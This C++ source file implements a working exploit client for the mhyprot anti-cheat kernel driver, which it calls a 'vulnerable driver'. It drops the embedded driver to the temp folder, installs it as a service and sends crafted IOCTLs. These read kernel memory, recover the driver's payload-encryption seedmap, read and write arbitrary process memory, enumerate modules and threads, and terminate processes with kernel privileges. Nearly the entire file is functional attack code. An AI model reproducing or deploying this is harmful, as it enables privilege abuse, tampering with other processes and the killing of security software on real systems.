/*
 * MIT License
 *
 * Copyright (c) 2020 Kento Oki
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include "mhyprot.hpp"

//
// initialization of its service and device
//
bool mhyprot::init()
{
    logger::log("[>] loading vulnerable driver...\n");

    char temp_path[MAX_PATH];
    const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

    if (length > MAX_PATH || !length)
    {
        logger::log("[!] failed to obtain temp path. (0x%lX)\n", GetLastError());
        return false;
    }

    //
    // place the driver binary into the temp path
    //
    const std::string placement_path = std::string(temp_path) + MHYPROT_SYSFILE_NAME;

    if (std::filesystem::exists(placement_path))
    {
        std::remove(placement_path.c_str());
    }

    //
    // create driver sys from memory
    //
    if (!file_utils::create_file_from_buffer(
        placement_path,
        (void*)resource::raw_driver,
        sizeof(resource::raw_driver)
    ))
    {
        logger::log("[!] failed to prepare %s. (0x%lX)\n", MHYPROT_SYSFILE_NAME, GetLastError());
        return false;
    }

    logger::log("[>] preparing service...\n");
    
    //
    // create service using winapi, this needs administrator privileage
    //
    detail::mhyplot_service_handle = service_utils::create_service(placement_path);

    if (!CHECK_HANDLE(detail::mhyplot_service_handle))
    {
        logger::log("[!] failed to create service. (0x%lX)\n", GetLastError());
        return false;
    }

    //
    // start the service
    //
    if (!service_utils::start_service(detail::mhyplot_service_handle))
    {
        logger::log("[!] failed to start service. (0x%lX)\n", GetLastError());
        return false;
    }

    logger::log("[<] %s prepared\n", MHYPROT_SYSFILE_NAME);

    //
    // open the handle of its driver device
    //
    detail::device_handle = CreateFile(
        TEXT(MHYPROT_DEVICE_NAME),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    if (!CHECK_HANDLE(detail::device_handle))
    {
        logger::log("[!] failed to obtain device handle (0x%lX)\n", GetLastError());
        return false;
    }

    logger::log("[+] device handle snatched (0x%llX)\n", detail::device_handle);

    logger::log("[>] mhyprot initialized successfully\n");

    return true;
}

void mhyprot::unload()
{
    if (detail::device_handle)
    {
        CloseHandle(detail::device_handle);
    }

    if (detail::mhyplot_service_handle)
    {
        service_utils::stop_service(detail::mhyplot_service_handle);
        service_utils::delete_service(detail::mhyplot_service_handle);
    }
}

//
// send ioctl request to the vulnerable driver
//
bool mhyprot::driver_impl::request_ioctl(
    const uint32_t ioctl_code,
    void* in_buffer, const size_t in_buffer_size
)
{
    //
    // allocate memory for this command result
    //
    void* out_buffer = calloc(1, in_buffer_size);
    DWORD out_buffer_size = 0;

    if (!out_buffer)
    {
        return false;
    }
    
    //
    // send the ioctl request
    //
    const bool result = DeviceIoControl(
        mhyprot::detail::device_handle,
        ioctl_code,
        in_buffer,
        in_buffer_size,
        out_buffer,
        in_buffer_size,
        &out_buffer_size,
        NULL
    );

    //
    // store the result
    //
    if (!out_buffer_size)
    {
        free(out_buffer);
        return false;
    }

    memcpy(in_buffer, out_buffer, out_buffer_size);
    free(out_buffer);

    return result;
}

//
// initialize driver implementations with payload encryption requirements
//
bool mhyprot::driver_impl::driver_init(bool debug_prints, bool print_seeds)
{
    logger::log("[>] initializing driver...\n");

    //
    // the driver initializer
    //
    MHYPROT_INITIALIZE initializer;
    initializer._m_002 = 0x0BAEBAEEC;
    initializer._m_003 = 0x0EBBAAEF4FFF89042;

    if (!request_ioctl(MHYPROT_IOCTL_INITIALIZE, &initializer, sizeof(initializer)))
    {
        logger::log("[!] failed to initialize mhyplot driver implementation\n");
        return false;
    }

    //
    // driver's base address in the system
    //
    uint64_t mhyprot_address = win_utils::
        find_sysmodule_address_by_name(MHYPROT_SYSFILE_NAME, debug_prints);

    if (!mhyprot_address)
    {
        logger::log("[!] failed to locate mhyprot module address. (0x%lX)\n", GetLastError());
        return false;
    }

    logger::log("[+] %s is @ 0x%llX\n", MHYPROT_SYSFILE_NAME, mhyprot_address);

    //
    // read the pointer that points to the seedmap that used to encrypt payloads
    // the pointer on the [driver.sys + 0xA0E8]
    //
    uint64_t seedmap_address = driver_impl::
        read_kernel_memory<uint64_t>(mhyprot_address + MHYPROT_OFFSET_SEEDMAP);

    logger::log("[+] seedmap in kernel [0x%llX + 0x%lX] @ (seedmap)0x%llX\n",
        mhyprot_address, MHYPROT_OFFSET_SEEDMAP, seedmap_address);

    if (!seedmap_address)
    {
        logger::log("[!] failed to locate seedmap in kernel\n");
        return false;
    }

    //
    // read the entire seedmap as size of 0x9C0
    //
    if (!driver_impl::read_kernel_memory(
        seedmap_address,
        &detail::seedmap,
        sizeof(detail::seedmap)
    ))
    {
        logger::log("[!] failed to pickup seedmap from kernel\n");
        return false;
    }

    for (int i = 0; i < (sizeof(detail::seedmap) / sizeof(detail::seedmap[0])); i++)
    {
        if (print_seeds)
            logger::log("[+] seedmap (%05d): 0x%llX\n", i, detail::seedmap[i]);
    }

    logger::log("[<] driver initialized successfully.\n");

    return true;
}

//
// encrypt the payload
//
void mhyprot::driver_impl::encrypt_payload(void* payload, const size_t size)
{
    if (size % 8)
    {
        logger::log("[!] (payload) size must be 8-byte alignment\n");
        return;
    }

    if (size / 8 >= 0x138)
    {
        logger::log("[!] (payload) size must be < 0x9C0\n");
        return;
    }

    uint64_t* p_payload = (uint64_t*)payload;
    uint64_t offset = 0;

    for (uint32_t i = 1; i < size / 8; i++)
    {
        const uint64_t key = generate_key(detail::seedmap[i - 1]);
        p_payload[i] = p_payload[i] ^ key ^ (offset + p_payload[0]);
        offset += 0x10;
    }
}

//
// read memory from the kernel using vulnerable ioctl
//
bool mhyprot::driver_impl::read_kernel_memory(
    const uint64_t address, void* buffer, const size_t size
)
{
    if (!buffer)
    {
        return false;
    }

    static_assert(
        sizeof(uint32_t) == 4,
        "invalid compiler specific size of uint32_t, this may cause BSOD"
        );

    size_t payload_size = size + sizeof(uint32_t);
    PMHYPROT_KERNEL_READ_REQUEST payload = (PMHYPROT_KERNEL_READ_REQUEST)calloc(1, payload_size);

    if (!payload)
    {
        return false;
    }

    payload->address = address;
    payload->size = size;

    if (!request_ioctl(MHYPROT_IOCTL_READ_KERNEL_MEMORY, payload, payload_size))
    {
        return false;
    }

    //
    // result will be overrided in first 4bytes of the payload
    //
    if (!*(uint32_t*)payload)
    {
        memcpy(buffer, reinterpret_cast<uint8_t*>(payload) + sizeof(uint32_t), size);
        return true;
    }

    return false;
}

//
// read specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::read_process_memory(
    const uint32_t process_id,
    const uint64_t address, void* buffer, const size_t size
)
{
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action_code = MHYPROT_ACTION_READ;   // action code
    payload.process_id = process_id;        // target process id
    payload.address = address;              // address
    payload.buffer = (uint64_t)buffer;      // our buffer
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}

//
// write specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::write_process_memory(
    const uint32_t process_id,
    const uint64_t address, void* buffer, const size_t size
)
{
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action_code = MHYPROT_ACTION_WRITE;  // action code
    payload.process_id = process_id;        // target process id
    payload.address = (uint64_t)buffer;     // our buffer
    payload.buffer = address;               // destination
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}

bool mhyprot::driver_impl::get_process_modules(
    const uint32_t process_id, const uint32_t max_count,
    std::vector<std::pair<std::wstring, std::wstring>>& result
)
{
    //
    // return is 0x3A0 alignment
    //
    const size_t payload_context_size = static_cast<uint64_t>(max_count) * MHYPROT_ENUM_PROCESS_MODULE_SIZE;

    //
    // payload buffer must have additional size to get result(s)
    //
    const size_t alloc_size = sizeof(MHYPROT_ENUM_PROCESS_MODULES_REQUEST) + payload_context_size;

    //
    // allocate memory
    //
    PMHYPROT_ENUM_PROCESS_MODULES_REQUEST payload =
        (PMHYPROT_ENUM_PROCESS_MODULES_REQUEST)calloc(1, alloc_size);

    if (!payload)
    {
        return false;
    }

    payload->process_id = process_id;   // target process id
    payload->max_count = max_count;     // max module count to lookup

    if (!request_ioctl(MHYPROT_IOCTL_ENUM_PROCESS_MODULES, payload, alloc_size))
    {
        free(payload);
        return false;
    }

    //
    // if the request was not succeed in the driver, first 4byte of payload will be zero'ed
    //
    if (!payload->process_id)
    {
        free(payload);
        return false;
    }

    //
    // result(s) are @ + 0x2
    //
    const void* payload_context = reinterpret_cast<void*>(payload + 0x2);

    for (uint64_t offset = 0x0;
        offset < payload_context_size;
        offset += MHYPROT_ENUM_PROCESS_MODULE_SIZE)
    {
        const std::wstring module_name = reinterpret_cast<wchar_t*>((uint64_t)payload_context + offset);
        const std::wstring module_path = reinterpret_cast<wchar_t*>((uint64_t)payload_context + (offset + 0x100));

        if (module_name.empty() && module_path.empty())
            continue;

        result.push_back({ module_name, module_path });
    }

    free(payload);
    return true;
}

//
// get system uptime by seconds
// this eventually calls KeQueryTimeIncrement in the driver context
//
uint32_t mhyprot::driver_impl::get_system_uptime()
{
    //
    // miliseconds
    //
    uint32_t result;

    static_assert(
        sizeof(uint32_t) == 4,
        "invalid compiler specific size of uint32_t, this may cause BSOD"
        );

    if (!request_ioctl(MHYPROT_IOCTL_GET_SYSTEM_UPTIME, &result, sizeof(uint32_t)))
    {
        return -1;
    }

    //
    // convert it to the seconds
    //
    return static_cast<uint32_t>(result / 1000);
}

bool mhyprot::driver_impl::get_process_threads(
    const uint32_t& process_id, const uint32_t& owner_process_id,
    std::vector<MHYPROT_THREAD_INFORMATION>& result
)
{
    //
    // allocation size must have enough size for result
    // and the result is 0xA8 alignment
    //
    const size_t alloc_size = 50 * MHYPROT_ENUM_PROCESS_THREADS_SIZE;

    //
    // allocate memory for payload and its result
    //
    PMHYPROT_ENUM_PROCESS_THREADS_REQUEST payload =
        (PMHYPROT_ENUM_PROCESS_THREADS_REQUEST)calloc(1, alloc_size);

    if (!payload)
    {
        return false;
    }

    payload->validation_code = MHYPROT_ENUM_PROCESS_THREADS_CODE;
    payload->process_id = process_id;
    payload->owner_process_id = process_id;

    if (!request_ioctl(MHYPROT_IOCTL_ENUM_PROCESS_THREADS, payload, alloc_size))
    {
        free(payload);
        return false;
    }

    //
    // if the request succeed in the driver context,
    // a number of threads that stored in the buffer will be reported
    // in first 4byte
    //
    if (!payload->validation_code ||
        payload->validation_code <= 0 ||
        payload->validation_code > 1000)
    {
        free(payload);
        return false;
    }

    const void* payload_context = reinterpret_cast<void*>(payload + 1);

    const uint32_t thread_count = payload->validation_code;

    for (uint64_t offset = 0x0;
        offset < (MHYPROT_ENUM_PROCESS_THREADS_SIZE * thread_count);
        offset += MHYPROT_ENUM_PROCESS_THREADS_SIZE)
    {
        const auto thread_information = 
            reinterpret_cast<PMHYPROT_THREAD_INFORMATION>((uint64_t)payload_context + offset);

        result.push_back(*thread_information);
    }

    free(payload);
    return true;
}

//
// terminate specific process by process id
// this eventually calls ZwTerminateProcess in the driver context
//
bool mhyprot::driver_impl::terminate_process(const uint32_t process_id)
{
    MHYPROT_TERMINATE_PROCESS_REQUEST payload;
    payload.process_id = process_id;

    encrypt_payload(&payload, sizeof(payload));

    if (!request_ioctl(MHYPROT_IOCTL_TERMINATE_PROCESS, &payload, sizeof(payload)))
    {
        return false;
    }

    if (!payload.response)
    {
        return false;
    }

    return true;
}
